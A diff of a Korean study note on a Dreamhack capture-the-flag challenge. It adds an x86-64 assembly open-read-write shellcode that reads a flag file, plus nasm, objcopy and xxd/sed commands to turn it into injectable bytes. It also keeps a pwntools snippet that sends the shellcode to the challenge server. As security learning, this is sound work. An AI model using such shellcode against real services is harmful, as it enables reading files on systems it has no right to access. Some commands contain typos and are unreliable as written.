@@ -4,6 +4,8 @@
 
 # 풀이 방법 1. c언어 skeleton 코드 이용
 
+- **1.~5. 까지는 원격 서버에 shellcode를 전달하기 위한 부분이고 6.이 실제 공격 과정이다.**
+
 1. 먼저 orw 쉘 코드를 작성 후 skeleton 코드를 통해 실행 파일(ELF) 파일을 생성한다.
 ```
 // File name: orw.c
@@ -56,7 +58,7 @@ int main() { run_sh(); }
 2. 차례대로 open, read, write 콜 이후 `rdi = 0x00(에러코드), rax = 0x3c`를 대입해 `exit(0)` 시스템 콜을 발생 후 종료한다.
 
 3. 이후 `gcc -o  orw orw.c` 명령어를 통해 orw ELF 파일을 생성 후 `objdump -d orw`를 통해 orw의 디스어셈블(-d 옵션) 결과를 확인한다.
-- objdump란, 쉽게 바이너리(ELF파일)의 정보를 보여주는 명령어라고 생각하면 됨
+- objdump란, 쉽게 바이너리(ELF파일)의 정보를 보여주는 명령어라고 생각하면 됨 ELF executable 파일만 objdump 가능하므로 .o 파일(ELF relocatable 파일)은 불가능
 
 4. orw 파일은 순수 어셈블리어 파일(.asm)이 아니므로 위 3. 결과에서 우리가 필요한 <run_sh> 함수 부분의 기계어 코드만 추출할 수 있도록 한다. <img width="840" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/b853b579-a05c-4f6a-8f10-a75918fbcbd4">
 
@@ -84,4 +86,65 @@ p.sendlineafter('shellcode: ', shellcode)
 print(p.recvuntil(b'}'))
 ```
 
+# 풀이방법 2. 어셈블리어 코드(.asm) 작성
+
+1. 위에서 skeleton 코드를 작성한 것과 달리 어셈블리어 코드를 작성하여 object파일 생성 후 이를 통해 opcode를 얻는 방법이다. 이를 위해 .asm 코드를 작성해준다.
+```
+section .text ; 섹션을 정해주는 부분 같음
+global start ; 코드를 어디서 시작할지 정하는 것 같음
+start:
+    xor rax, rax
+    push rax
+    mov rax, 0x676e6f6f6f6f6f6f
+    push rax
+    mov rax, 0x6c5f73695f656d61
+    push rax
+    mov rax, 0x6e5f67616c662f63
+    push rax
+    mov rax, 0x697361625f6c6c65
+    push rax
+    mov rax, 0x68732f656d6f682f
+    push rax
+
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 0x02
+    syscall ; open call
+
+    mov rdi, rax
+    mov rsi, rsp
+    sub rsi, 0x30
+    mov rdx, 0x30
+    xor rax, rax
+    syscall
+
+    mov rdi, 0x1
+    mov rax, 0x1
+    syscall
+
+    xor rdi, rdi
+    mov rax, 0x3c
+    syscall
+```
+
+2. 위 코드를 object 코드(Object 코드, ELF relocatable 기계어 코드)로 변환하기 위해 `nasm -f elf64 orw.asm` 명령어를 실행하면 `orw.o` 파일 생성
+- 여기서 **nasm**은 어셈블리어 코드를 기계어 코드로 **어셈블** 해주는 명렁어이다. gcc -c 옵션으로 불가능한 이유는 gcc는 기본적으로 c언어 소스파일에 사용가능하기 때문에 어셈블리어 코드에는 사용 불가능
+
+3. 생성한 orw.o 파일에서 opcode를 가져오기 위해 `objcopy —-dump-section .text=orw.bin orw.o`를 통해 `orw.bin` 파일을 생성 후 `xxd orw.bin` 명령어를 통해 hex 형식의 기계어 코드를 확인
+- 여기서 **objcopy**는 Object 파일을 복사하고 조작하는데 사용하는 명령어이다.   
+여기서 `--dump-section` 명령어를 뒤의 section 부분을 새로 생성한 파일에 copy하는 옵션이다. `objdump`를 사용하지 않는 이유는 object 파일은 ELF executable 파일이 아닌 ELF relocatable 파일이기 때문이다.
+
+4. 여기서 opcode를 \x 형식으로 가져오기 위해 `xxd -p orw.bin | sed 's/\(..\)/\\x\1/g' | awk '{printf "%s", $0}'` 명령어 실행
+- `xxd -p example.bin`: 이 명령은 이진 파일 example.bin의 내용을 일반 16진수 형식으로 덤프
+- `sed 's/\(..\)/\\x\1/g'`: 이 sed 명령은 모든 두 문자 (바이트)를 캡처하고 캡처된 문자 뒤에 \x를 붙여 이를 대체함, 이를 통해 각 바이트를 \xHH 형식으로 변환
+- `awk '{printf "%s", $0}'`: 이 awk 명령은 줄 바꿈을 추가하지 않고 출력을 출력함, 이를 통해 전체 16진수 배열이 한 줄로 출력
+
+5. 이후 과정은 python 파일 작성 부분으로 풀이 방법 1과 동일
+
+### 참고 정리
+
+- `orw.c->orw` : `gcc -o orw orw.c` 
+- `orw.asm->orw.o` : `nasm -f elf64 orw.asm`
+- `orw.o->orw.bin` : `obcopy —dump-section .text=orw.bin orw.o`
 
